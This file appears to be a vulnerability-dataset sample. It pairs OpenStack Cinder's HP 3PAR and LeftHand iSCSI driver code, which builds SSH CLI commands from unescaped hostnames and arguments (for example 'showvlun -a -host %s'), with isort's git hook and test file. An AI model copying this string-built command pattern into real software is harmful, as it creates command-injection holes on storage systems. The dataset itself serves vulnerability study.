                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _(""Invalid IP address format '%s'"") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _(""Found invalid iSCSI IP address(s) in configuration ""
                    ""option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'"") % \
                   ("", "".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """"""Clone an existing volume.""""""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """"""
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': ""%s:%s"" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \
              (persona_id, domain, hostname, iscsi_iqn)
        out = self.common._cli_run(cmd, None)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'
                             % (hostname, iscsi_iqn), None)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """"""Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """"""
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _(""Least busy iSCSI port not found, ""
                        ""using first iSCSI port in list."")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """"""Return the list of candidate nsps.""""""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """"""Return IP assiciated with given nsp.""""""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """"""Return the active nsp, if one exists, for the given host.""""""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"""""Return the nsp that has the fewest active vluns.""""""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/n/cinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
""""""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """"""Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """"""

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """"""Runs a CLIQ command over SSH, without doing any result parsing""""""
        cliq_arg_strings = []
        for k, v in cliq_args.items():
            cliq_arg_strings.append("" %s=%s"" % (k, v))
        cmd = verb + ''.join(cliq_arg_strings)

        return self._run_ssh(cmd, check_exit_code)

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """"""Runs a CLIQ command over SSH, parsing and checking the output""""""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_(""CLIQ command returned %s""), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find(""response"")
            if response_node is None:
                msg = (_(""Malformed response to CLIQ command ""
                         ""%(verb)s %(cliq_args)s. Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get(""result"")

            if result_code != ""0"":
                msg = (_(""Error running CLIQ command %(verb)s %(cliq_args)s. ""
                         "" Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """"""Queries for info about the cluster (including IP)""""""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml(""getClusterInfo"", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """"""Gets the IP on which a cluster shares iSCSI volumes""""""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall(""response/cluster/vip""):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_(""Unexpected number of virtual ips for cluster ""
                 "" %(cluster_name)s. Result=%(_xml)s"") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """"""Gets the volume info, including IQN""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml(""getVolumeInfo"", cliq_args)

        # Result looks like this:
        #<gauche version=""1.0"">
        #  <response description=""Operation succeeded."" name=""CliqSuccess""
        #            processingTime=""87"" result=""0"">
        #    <volume autogrowPages=""4"" availability=""online"" blockSize=""1024""
        #       bytesWritten=""0"" checkSum=""false"" clusterName=""Cluster01""
        #       created=""2011-02-08T19:56:53Z"" deleting=""false"" description=""""
        #       groupName=""Group01"" initialQuota=""536870912"" isPrimary=""true""
        #       iscsiIqn=""iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b""
        #       maxSize=""6865387257856"" md5=""9fa5c8b2cca54b2948a63d833097e1ca""
        #       minReplication=""1"" name=""vol-b"" parity=""0"" replication=""2""
        #       reserveQuota=""536870912"" scratchQuota=""4194304""
        #       serialNumber=""9fa5c8b2cca54b2948a63d833097e1ca0000000000006316""
        #       size=""1073741824"" stridePages=""32"" thinProvision=""true"">
        #      <status description=""OK"" value=""2""/>
        #      <permission access=""rw""
        #            authGroup=""api-34281B815713B78-(trimmed)51ADD4B7030853AA7""
        #            chapName=""chapusername"" chapRequired=""true"" id=""25369""
        #            initiatorSecret="""" iqn="""" iscsiEnabled=""true""
        #            loadBalance=""true"" targetSecret=""supersecret""/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find(""response/volume"")
        for k, v in volume_node.attrib.items():
            volume_attributes[""volume."" + k] = v

        status_node = volume_node.find(""status"")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""status."" + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find(""permission"")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""permission."" + k] = v

        LOG.debug(_(""Volume info: %(volume_name)s => %(volume_attributes)s"") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """"""Creates a volume.""""""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml(""createVolume"", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + "":3260,"" + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = (""%s %s %s"" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.""""""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """"""Creates a snapshot.""""""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """"""Deletes a volume.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error(""Volume did not exist. It will not be deleted"")
            return
        self._cliq_run_xml(""deleteVolume"", cliq_args)

    def local_path(self, volume):
        msg = _(""local_path not supported"")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """"""
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""assignVolumeToServer"", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml(""getServerInfo"", cliq_args, False)
        response = out.find(""response"")
        result = response.attrib.get(""result"")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml(""createServer"", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Unassign the volume from the host.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""unassignVolumeToServer"", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml(""getClusterInfo"", {})
        cluster_node = result_xml.find(""response/cluster"")
        total_capacity = cluster_node.attrib.get(""spaceTotal"")
        free_capacity = cluster_node.attrib.get(""unprovisionedSpace"")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data
/n/n/n",1
196,196,1ab38f4f7840a3c19bf961a24630a992a8373a76,"isort/hooks.py/n/n""""""isort.py.

Defines a git hook to allow pre-commit warnings and errors about import order.

usage:
    exit_code = git_hook(strict=True|False, modify=True|False)

Copyright (C) 2015  Helen Sherwood-Taylor

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
documentation files (the ""Software""), to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or
substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

""""""
import subprocess
from typing import List

from isort import SortImports


def get_output(command: List[str]) -> str:
    """"""
    Run a command and return raw output

    :param str command: the command to run
    :returns: the stdout output of the command
    """"""
    result = subprocess.run(command, stdout=subprocess.PIPE, check=True)
    return result.stdout.decode()


def get_lines(command: List[str]) -> List[str]:
    """"""
    Run a command and return lines of output

    :param str command: the command to run
    :returns: list of whitespace-stripped lines output by command
    """"""
    stdout = get_output(command)
    return [line.strip() for line in stdout.splitlines()]


def git_hook(strict=False, modify=False):
    """"""
    Git pre-commit hook to check staged files for isort errors

    :param bool strict - if True, return number of errors on exit,
        causing the hook to fail. If False, return zero so it will
        just act as a warning.
    :param bool modify - if True, fix the sources if they are not
        sorted properly. If False, only report result without
        modifying anything.

    :return number of errors if in strict mode, 0 otherwise.
    """"""

    # Get list of files modified and staged
    diff_cmd = [""git"", ""diff-index"", ""--cached"", ""--name-only"", ""--diff-filter=ACMRTUXB HEAD""]
    files_modified = get_lines(diff_cmd)

    errors = 0
    for filename in files_modified:
        if filename.endswith('.py'):
            # Get the staged contents of the file
            staged_cmd = [""git"", ""show"", "":%s"" % filename]
            staged_contents = get_output(staged_cmd)

            sort = SortImports(
                file_path=filename,
                file_contents=staged_contents,
                check=True
            )

            if sort.incorrectly_sorted:
                errors += 1
                if modify:
                    SortImports(
                        file_path=filename,
                        file_contents=staged_contents,
                        check=False,
                    )

    return errors if strict else 0
/n/n/ntest_isort.py/n/n""""""test_isort.py.

Tests all major functionality of the isort library
Should be ran using py.test by simply running py.test in the isort project directory

Copyright (C) 2013  Timothy Edmund Crosley

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
documentation files (the ""Software""), to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or
substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

""""""
import io
import os
import os.path
import posixpath
import subprocess
import sys
import sysconfig
from tempfile import NamedTemporaryFile
from typing import Any, Dict, List

import py
import pytest

from isort import finders, main, settings
from isort.main import is_python_file, SortImports
from isort.settings import WrapModes
from isort.utils import exists_case_sensitive

try:
    import toml
except ImportError:
    toml = None

TEST_DEFAULT_CONFIG = """"""
[*.py]
max_line_length = 120
indent_style = space
indent_size = 4
known_first_party = isort
known_third_party = kate
ignore_frosted_errors = E103
skip = build,.tox,venv
balanced_wrapping = true
not_skip = __init__.py
""""""
SHORT_IMPORT = ""from third_party import lib1, lib2, lib3, lib4""
SINGLE_FROM_IMPORT = ""from third_party import lib1""
SINGLE_LINE_LONG_IMPORT = ""from third_party import lib1, lib2, lib3, lib4, lib5, lib5ab""
REALLY_LONG_IMPORT = (""from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, lib10, lib11,""
                      ""lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22"")
REALLY_LONG_IMPORT_WITH_COMMENT = (""from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, ""
                                   ""lib10, lib11, lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22""
                                   "" # comment"")


@pytest.fixture(scope=""session"", autouse=True)
def default_settings_path(tmpdir_factory):
    config_dir = tmpdir_factory.mktemp('config')
    config_file = config_dir.join('.editorconfig').strpath
    with open(config_file, 'w') as editorconfig:
        editorconfig.write(TEST_DEFAULT_CONFIG)

    with config_dir.as_cwd():
        yield config_dir.strpath


def test_happy_path():
    """"""Test the most basic use case, straight imports no code, simply not organized by category.""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import myproject.test\n""
                  ""import django.settings"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""import django.settings\n""
                           ""\n""
                           ""import myproject.test\n"")


def test_code_intermixed():
    """"""Defines what should happen when isort encounters imports intermixed with
    code.

    (it should pull them all to the top)

    """"""
    test_input = (""import sys\n""
                  ""print('yo')\n""
                  ""print('I like to put code between imports cause I want stuff to break')\n""
                  ""import myproject.test\n"")
    test_output = SortImports(file_contents=test_input).output
    assert test_output == (""import sys\n""
                           ""\n""
                           ""import myproject.test\n""
                           ""\n""
                           ""print('yo')\n""
                           ""print('I like to put code between imports cause I want stuff to break')\n"")


def test_correct_space_between_imports():
    """"""Ensure after imports a correct amount of space (in newlines) is
    enforced.

    (2 for method, class, or decorator definitions 1 for anything else)

    """"""
    test_input_method = (""import sys\n""
                         ""def my_method():\n""
                         ""    print('hello world')\n"")
    test_output_method = SortImports(file_contents=test_input_method).output
    assert test_output_method == (""import sys\n""
                                  ""\n""
                                  ""\n""
                                  ""def my_method():\n""
                                  ""    print('hello world')\n"")

    test_input_decorator = (""import sys\n""
                            ""@my_decorator\n""
                            ""def my_method():\n""
                            ""    print('hello world')\n"")
    test_output_decorator = SortImports(file_contents=test_input_decorator).output
    assert test_output_decorator == (""import sys\n""
                                     ""\n""
                                     ""\n""
                                     ""@my_decorator\n""
                                     ""def my_method():\n""
                                     ""    print('hello world')\n"")

    test_input_class = (""import sys\n""
                        ""class MyClass(object):\n""
                        ""    pass\n"")
    test_output_class = SortImports(file_contents=test_input_class).output
    assert test_output_class == (""import sys\n""
                                 ""\n""
                                 ""\n""
                                 ""class MyClass(object):\n""
                                 ""    pass\n"")

    test_input_other = (""import sys\n""
                        ""print('yo')\n"")
    test_output_other = SortImports(file_contents=test_input_other).output
    assert test_output_other == (""import sys\n""
                                 ""\n""
                                 ""print('yo')\n"")


def test_sort_on_number():
    """"""Ensure numbers get sorted logically (10 > 9 not the other way around)""""""
    test_input = (""import lib10\n""
                  ""import lib9\n"")
    test_output = SortImports(file_contents=test_input).output
    assert test_output == (""import lib9\n""
                           ""import lib10\n"")


def test_line_length():
    """"""Ensure isort enforces the set line_length.""""""
    assert len(SortImports(file_contents=REALLY_LONG_IMPORT, line_length=80).output.split(""\n"")[0]) <= 80
    assert len(SortImports(file_contents=REALLY_LONG_IMPORT, line_length=120).output.split(""\n"")[0]) <= 120

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, line_length=42).output
    assert test_output == (""from third_party import (lib1, lib2, lib3,\n""
                           ""                         lib4, lib5, lib6,\n""
                           ""                         lib7, lib8, lib9,\n""
                           ""                         lib10, lib11,\n""
                           ""                         lib12, lib13,\n""
                           ""                         lib14, lib15,\n""
                           ""                         lib16, lib17,\n""
                           ""                         lib18, lib20,\n""
                           ""                         lib21, lib22)\n"")

    TEST_INPUT = ('from django.contrib.gis.gdal.field import (\n'
                  '    OFTDate, OFTDateTime, OFTInteger, OFTInteger64, OFTReal, OFTString,\n'
                  '    OFTTime,\n'
                  ')\n')  # Test case described in issue #654
    assert SortImports(file_contents=TEST_INPUT, include_trailing_comma=True, line_length=79,
                       multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, balanced_wrapping=False).output == TEST_INPUT

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, line_length=42, wrap_length=32).output
    assert test_output == (""from third_party import (lib1,\n""
                           ""                         lib2,\n""
                           ""                         lib3,\n""
                           ""                         lib4,\n""
                           ""                         lib5,\n""
                           ""                         lib6,\n""
                           ""                         lib7,\n""
                           ""                         lib8,\n""
                           ""                         lib9,\n""
                           ""                         lib10,\n""
                           ""                         lib11,\n""
                           ""                         lib12,\n""
                           ""                         lib13,\n""
                           ""                         lib14,\n""
                           ""                         lib15,\n""
                           ""                         lib16,\n""
                           ""                         lib17,\n""
                           ""                         lib18,\n""
                           ""                         lib20,\n""
                           ""                         lib21,\n""
                           ""                         lib22)\n"")


def test_output_modes():
    """"""Test setting isort to use various output modes works as expected""""""
    test_output_grid = SortImports(file_contents=REALLY_LONG_IMPORT,
                                   multi_line_output=WrapModes.GRID, line_length=40).output
    assert test_output_grid == (""from third_party import (lib1, lib2,\n""
                                ""                         lib3, lib4,\n""
                                ""                         lib5, lib6,\n""
                                ""                         lib7, lib8,\n""
                                ""                         lib9, lib10,\n""
                                ""                         lib11, lib12,\n""
                                ""                         lib13, lib14,\n""
                                ""                         lib15, lib16,\n""
                                ""                         lib17, lib18,\n""
                                ""                         lib20, lib21,\n""
                                ""                         lib22)\n"")

    test_output_vertical = SortImports(file_contents=REALLY_LONG_IMPORT,
                                       multi_line_output=WrapModes.VERTICAL, line_length=40).output
    assert test_output_vertical == (""from third_party import (lib1,\n""
                                    ""                         lib2,\n""
                                    ""                         lib3,\n""
                                    ""                         lib4,\n""
                                    ""                         lib5,\n""
                                    ""                         lib6,\n""
                                    ""                         lib7,\n""
                                    ""                         lib8,\n""
                                    ""                         lib9,\n""
                                    ""                         lib10,\n""
                                    ""                         lib11,\n""
                                    ""                         lib12,\n""
                                    ""                         lib13,\n""
                                    ""                         lib14,\n""
                                    ""                         lib15,\n""
                                    ""                         lib16,\n""
                                    ""                         lib17,\n""
                                    ""                         lib18,\n""
                                    ""                         lib20,\n""
                                    ""                         lib21,\n""
                                    ""                         lib22)\n"")

    comment_output_vertical = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                          multi_line_output=WrapModes.VERTICAL, line_length=40).output
    assert comment_output_vertical == (""from third_party import (lib1,  # comment\n""
                                       ""                         lib2,\n""
                                       ""                         lib3,\n""
                                       ""                         lib4,\n""
                                       ""                         lib5,\n""
                                       ""                         lib6,\n""
                                       ""                         lib7,\n""
                                       ""                         lib8,\n""
                                       ""                         lib9,\n""
                                       ""                         lib10,\n""
                                       ""                         lib11,\n""
                                       ""                         lib12,\n""
                                       ""                         lib13,\n""
                                       ""                         lib14,\n""
                                       ""                         lib15,\n""
                                       ""                         lib16,\n""
                                       ""                         lib17,\n""
                                       ""                         lib18,\n""
                                       ""                         lib20,\n""
                                       ""                         lib21,\n""
                                       ""                         lib22)\n"")

    test_output_hanging_indent = SortImports(file_contents=REALLY_LONG_IMPORT,
                                             multi_line_output=WrapModes.HANGING_INDENT,
